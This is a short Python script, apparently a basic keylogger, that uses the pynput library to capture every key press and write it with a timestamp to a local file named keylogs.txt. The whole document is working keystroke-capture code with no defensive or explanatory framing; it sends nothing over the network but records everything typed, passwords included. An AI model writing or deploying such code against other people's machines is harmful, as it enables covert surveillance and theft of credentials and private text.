from pynput.keyboard import Key, Listener
import logging

# Function to write key presses to a log file
log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))
	
# Start listening for key events
with Listener(on_press=on_press) as listener:
    listener.join()
